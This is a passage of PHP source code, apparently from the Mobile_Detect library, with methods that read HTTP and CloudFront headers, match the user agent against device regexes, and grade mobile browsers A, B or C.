		'webOS'			=> array('webOS/[VER]', 'hpwOS/[VER];'),
	);
	public function __construct(
		array $headers = null,
		$userAgent = null
	) {
		$this->setHttpHeaders($headers);
		$this->setUserAgent($userAgent);
	}
	public static function getScriptVersion()
	{
		return self::VERSION;
	}
	public function setHttpHeaders($httpHeaders = null)
	{
		// use global _SERVER if $httpHeaders aren't defined
		if (!is_array($httpHeaders) || !count($httpHeaders)) {
			$httpHeaders = $_SERVER;
		}
		// clear existing headers
		$this->httpHeaders = array();
		// Only save HTTP headers. In PHP land, that means only _SERVER vars that
		// start with HTTP_.
		foreach ($httpHeaders as $key => $value) {
			if (substr($key, 0, 5) === 'HTTP_') {
				$this->httpHeaders[$key] = $value;
			}
		}
		// In case we're dealing with CloudFront, we need to know.
		$this->setCfHeaders($httpHeaders);
	}
	public function getHttpHeaders()
	{
		return $this->httpHeaders;
	}
	public function getHttpHeader($header)
	{
		// are we using PHP-flavored headers?
		if (strpos($header, '_') === false) {
			$header = str_replace('-', '_', $header);
			$header = strtoupper($header);
		}
		// test the alternate, too
		$altHeader = 'HTTP_' . $header;
		//Test both the regular and the HTTP_ prefix
		if (isset($this->httpHeaders[$header])) {
			return $this->httpHeaders[$header];
		} elseif (isset($this->httpHeaders[$altHeader])) {
			return $this->httpHeaders[$altHeader];
		}
		return null;
	}
	public function getMobileHeaders()
	{
		return self::$mobileHeaders;
	}
	public function getUaHttpHeaders()
	{
		return self::$uaHttpHeaders;
	}
	public function setCfHeaders($cfHeaders = null) {
		// use global _SERVER if $cfHeaders aren't defined
		if (!is_array($cfHeaders) || !count($cfHeaders)) {
			$cfHeaders = $_SERVER;
		}
		// clear existing headers
		$this->cloudfrontHeaders = array();
		// Only save CLOUDFRONT headers. In PHP land, that means only _SERVER vars that
		// start with cloudfront-.
		$response = false;
		foreach ($cfHeaders as $key => $value) {
			if (substr(strtolower($key), 0, 16) === 'http_cloudfront_') {
				$this->cloudfrontHeaders[strtoupper($key)] = $value;
				$response = true;
			}
		}
		return $response;
	}
	public function getCfHeaders()
	{
		return $this->cloudfrontHeaders;
	}
	private function prepareUserAgent($userAgent) {
		$userAgent = trim($userAgent);
		$userAgent = substr($userAgent, 0, 500);
		return $userAgent;
	}
	public function setUserAgent($userAgent = null)
	{
		// Invalidate cache due to #375
		$this->cache = array();
		if (false === empty($userAgent)) {
			return $this->userAgent = $this->prepareUserAgent($userAgent);
		} else {
			$this->userAgent = null;
			foreach ($this->getUaHttpHeaders() as $altHeader) {
				if (false === empty($this->httpHeaders[$altHeader])) { // @todo: should use getHttpHeader(), but it would be slow. (Serban)
					$this->userAgent .= $this->httpHeaders[$altHeader] . " ";
				}
			}
			if (!empty($this->userAgent)) {
				return $this->userAgent = $this->prepareUserAgent($this->userAgent);
			}
		}
		if (count($this->getCfHeaders()) > 0) {
			return $this->userAgent = 'Amazon CloudFront';
		}
		return $this->userAgent = null;
	}
	public function getUserAgent()
	{
		return $this->userAgent;
	}
	public function setDetectionType($type = null)
	{
		if ($type === null) {
			$type = self::DETECTION_TYPE_MOBILE;
		}
		if ($type !== self::DETECTION_TYPE_MOBILE && $type !== self::DETECTION_TYPE_EXTENDED) {
			return;
		}
		$this->detectionType = $type;
	}
	public function getMatchingRegex()
	{
		return $this->matchingRegex;
	}
	public function getMatchesArray()
	{
		return $this->matchesArray;
	}
	public static function getPhoneDevices()
	{
		return self::$phoneDevices;
	}
	public static function getTabletDevices()
	{
		return self::$tabletDevices;
	}
	public static function getUserAgents()
	{
		return self::getBrowsers();
	}
	public static function getBrowsers()
	{
		return self::$browsers;
	}
	public static function getUtilities()
	{
		return self::$utilities;
	}
	public static function getMobileDetectionRules()
	{
		static $rules;
		if (!$rules) {
			$rules = array_merge(
				self::$phoneDevices,
				self::$tabletDevices,
				self::$operatingSystems,
				self::$browsers
			);
		}
		return $rules;
	}
	public function getMobileDetectionRulesExtended()
	{
		static $rules;
		if (!$rules) {
			// Merge all rules together.
			$rules = array_merge(
				self::$phoneDevices,
				self::$tabletDevices,
				self::$operatingSystems,
				self::$browsers,
				self::$utilities
			);
		}
		return $rules;
	}
	public function getRules()
	{
		if ($this->detectionType == self::DETECTION_TYPE_EXTENDED) {
			return self::getMobileDetectionRulesExtended();
		} else {
			return self::getMobileDetectionRules();
		}
	}
	public static function getOperatingSystems()
	{
		return self::$operatingSystems;
	}
	public function checkHttpHeadersForMobile()
	{
		foreach ($this->getMobileHeaders() as $mobileHeader => $matchType) {
			if (isset($this->httpHeaders[$mobileHeader])) {
				if (is_array($matchType['matches'])) {
					foreach ($matchType['matches'] as $_match) {
						if (strpos($this->httpHeaders[$mobileHeader], $_match) !== false) {
							return true;
						}
					}
					return false;
				} else {
					return true;
				}
			}
		}
		return false;
	}
	public function __call($name, $arguments)
	{
		if (substr($name, 0, 2) !== 'is') {
			throw new BadMethodCallException("No such method exists: $name");
		}
		$this->setDetectionType(self::DETECTION_TYPE_MOBILE);
		$key = substr($name, 2);
		return $this->matchUAAgainstKey($key);
	}
	protected function matchDetectionRulesAgainstUA($userAgent = null)
	{
		foreach ($this->getRules() as $_regex) {
			if (empty($_regex)) {
				continue;
			}
			if ($this->match($_regex, $userAgent)) {
				return true;
			}
		}
		return false;
	}
	protected function matchUAAgainstKey($key)
	{
		// Make the keys lowercase so we can match: isIphone(), isiPhone(), isiphone(), etc.
		$key = strtolower($key);
		if (false === isset($this->cache[$key])) {
			$_rules = array_change_key_case($this->getRules());
			if (false === empty($_rules[$key])) {
				$this->cache[$key] = $this->match($_rules[$key]);
			}
			if (false === isset($this->cache[$key])) {
				$this->cache[$key] = false;
			}
		}
		return $this->cache[$key];
	}
	public function isMobile($userAgent = null, $httpHeaders = null)
	{
		if ($httpHeaders) {
			$this->setHttpHeaders($httpHeaders);
		}
		if ($userAgent) {
			$this->setUserAgent($userAgent);
		}
		if ($this->getUserAgent() === 'Amazon CloudFront') {
			$cfHeaders = $this->getCfHeaders();
			if(array_key_exists('HTTP_CLOUDFRONT_IS_MOBILE_VIEWER', $cfHeaders) && $cfHeaders['HTTP_CLOUDFRONT_IS_MOBILE_VIEWER'] === 'true') {
				return true;
			}
		}
		$this->setDetectionType(self::DETECTION_TYPE_MOBILE);
		if ($this->checkHttpHeadersForMobile()) {
			return true;
		} else {
			return $this->matchDetectionRulesAgainstUA();
		}
	}
	public function isTablet($userAgent = null, $httpHeaders = null)
	{
		// Check specifically for cloudfront headers if the useragent === 'Amazon CloudFront'
		if ($this->getUserAgent() === 'Amazon CloudFront') {
			$cfHeaders = $this->getCfHeaders();
			if(array_key_exists('HTTP_CLOUDFRONT_IS_TABLET_VIEWER', $cfHeaders) && $cfHeaders['HTTP_CLOUDFRONT_IS_TABLET_VIEWER'] === 'true') {
				return true;
			}
		}
		$this->setDetectionType(self::DETECTION_TYPE_MOBILE);
		foreach (self::$tabletDevices as $_regex) {
			if ($this->match($_regex, $userAgent)) {
				return true;
			}
		}
		return false;
	}
	public function is($key, $userAgent = null, $httpHeaders = null)
	{
		// Set the UA and HTTP headers only if needed (eg. batch mode).
		if ($httpHeaders) {
			$this->setHttpHeaders($httpHeaders);
		}
		if ($userAgent) {
			$this->setUserAgent($userAgent);
		}
		$this->setDetectionType(self::DETECTION_TYPE_EXTENDED);
		return $this->matchUAAgainstKey($key);
	}
	public function match($regex, $userAgent = null)
	{
		$match = (bool) preg_match(sprintf('#%s#is', $regex), (false === empty($userAgent) ? $userAgent : $this->userAgent), $matches);
		// If positive match is found, store the results for debug.
		if ($match) {
			$this->matchingRegex = $regex;
			$this->matchesArray = $matches;
		}
		return $match;
	}
	public static function getProperties()
	{
		return self::$properties;
	}
	public function prepareVersionNo($ver)
	{
		$ver = str_replace(array('_', ' ', '/'), '.', $ver);
		$arrVer = explode('.', $ver, 2);
		if (isset($arrVer[1])) {
			$arrVer[1] = @str_replace('.', '', $arrVer[1]); // @todo: treat strings versions.
		}
		return (float) implode('.', $arrVer);
	}
	public function version($propertyName, $type = self::VERSION_TYPE_STRING)
	{
		if (empty($propertyName)) {
			return false;
		}
		if ($type !== self::VERSION_TYPE_STRING && $type !== self::VERSION_TYPE_FLOAT) {
			$type = self::VERSION_TYPE_STRING;
		}
		$properties = self::getProperties();
		if (true === isset($properties[$propertyName])) {
			$properties[$propertyName] = (array) $properties[$propertyName];
			foreach ($properties[$propertyName] as $propertyMatchString) {
				$propertyPattern = str_replace('[VER]', self::VER, $propertyMatchString);
				preg_match(sprintf('#%s#is', $propertyPattern), $this->userAgent, $match);
				if (false === empty($match[1])) {
					$version = ($type == self::VERSION_TYPE_FLOAT ? $this->prepareVersionNo($match[1]) : $match[1]);
					return $version;
				}
			}
		}
		return false;
	}
	public function mobileGrade()
	{
		$isMobile = $this->isMobile();
		if (
			$this->is('iOS') && $this->version('iPad', self::VERSION_TYPE_FLOAT) >= 4.3 ||
			$this->is('iOS') && $this->version('iPhone', self::VERSION_TYPE_FLOAT) >= 4.3 ||
			$this->is('iOS') && $this->version('iPod', self::VERSION_TYPE_FLOAT) >= 4.3 ||
			( $this->version('Android', self::VERSION_TYPE_FLOAT)>2.1 && $this->is('Webkit') ) ||
			$this->version('Windows Phone OS', self::VERSION_TYPE_FLOAT) >= 7.5 ||
			$this->is('BlackBerry') && $this->version('BlackBerry', self::VERSION_TYPE_FLOAT) >= 6.0 ||
			$this->match('Playbook.*Tablet') ||
			( $this->version('webOS', self::VERSION_TYPE_FLOAT) >= 1.4 && $this->match('Palm|Pre|Pixi') ) ||
			$this->match('hp.*TouchPad') ||
			( $this->is('Firefox') && $this->version('Firefox', self::VERSION_TYPE_FLOAT) >= 18 ) ||
			( $this->is('Chrome') && $this->is('AndroidOS') && $this->version('Android', self::VERSION_TYPE_FLOAT) >= 4.0 ) ||
			( $this->is('Skyfire') && $this->version('Skyfire', self::VERSION_TYPE_FLOAT) >= 4.1 && $this->is('AndroidOS') && $this->version('Android', self::VERSION_TYPE_FLOAT) >= 2.3 ) ||
			( $this->is('Opera') && $this->version('Opera Mobi', self::VERSION_TYPE_FLOAT) >= 11.5 && $this->is('AndroidOS') ) ||
			$this->is('MeeGoOS') ||
			$this->is('Tizen') ||
			$this->is('Dolfin') && $this->version('Bada', self::VERSION_TYPE_FLOAT) >= 2.0 ||
			( ($this->is('UC Browser') || $this->is('Dolfin')) && $this->version('Android', self::VERSION_TYPE_FLOAT) >= 2.3 ) ||
			( $this->match('Kindle Fire') ||
			$this->is('Kindle') && $this->version('Kindle', self::VERSION_TYPE_FLOAT) >= 3.0 ) ||
			$this->is('AndroidOS') && $this->is('NookTablet') ||
			$this->version('Chrome', self::VERSION_TYPE_FLOAT) >= 16 && !$isMobile ||
			$this->version('Safari', self::VERSION_TYPE_FLOAT) >= 5.0 && !$isMobile ||
			$this->version('Firefox', self::VERSION_TYPE_FLOAT) >= 10.0 && !$isMobile ||
			$this->version('IE', self::VERSION_TYPE_FLOAT) >= 7.0 && !$isMobile ||
			$this->version('Opera', self::VERSION_TYPE_FLOAT) >= 10 && !$isMobile
		){
			return self::MOBILE_GRADE_A;
		}
		if (
			$this->is('iOS') && $this->version('iPad', self::VERSION_TYPE_FLOAT)<4.3 ||
			$this->is('iOS') && $this->version('iPhone', self::VERSION_TYPE_FLOAT)<4.3 ||
			$this->is('iOS') && $this->version('iPod', self::VERSION_TYPE_FLOAT)<4.3 ||
			$this->is('Blackberry') && $this->version('BlackBerry', self::VERSION_TYPE_FLOAT) >= 5 && $this->version('BlackBerry', self::VERSION_TYPE_FLOAT)<6 ||
			($this->version('Opera Mini', self::VERSION_TYPE_FLOAT) >= 5.0 && $this->version('Opera Mini', self::VERSION_TYPE_FLOAT) <= 7.0 &&
			($this->version('Android', self::VERSION_TYPE_FLOAT) >= 2.3 || $this->is('iOS')) ) ||
			$this->match('NokiaN8|NokiaC7|N97.*Series60|Symbian/3') ||
			$this->version('Opera Mobi', self::VERSION_TYPE_FLOAT) >= 11 && $this->is('SymbianOS')
		){
			return self::MOBILE_GRADE_B;
		}
		if (
			$this->version('BlackBerry', self::VERSION_TYPE_FLOAT) <= 5.0 ||
			$this->match('MSIEMobile|Windows CE.*Mobile') || $this->version('Windows Mobile', self::VERSION_TYPE_FLOAT) <= 5.2 ||
			$this->is('iOS') && $this->version('iPad', self::VERSION_TYPE_FLOAT) <= 3.2 ||
			$this->is('iOS') && $this->version('iPhone', self::VERSION_TYPE_FLOAT) <= 3.2 ||
			$this->is('iOS') && $this->version('iPod', self::VERSION_TYPE_FLOAT) <= 3.2 ||
			$this->version('IE', self::VERSION_TYPE_FLOAT) <= 7.0 && !$isMobile
		){
			return self::MOBILE_GRADE_C;
		}
		return self::MOBILE_GRADE_C;
	}
}
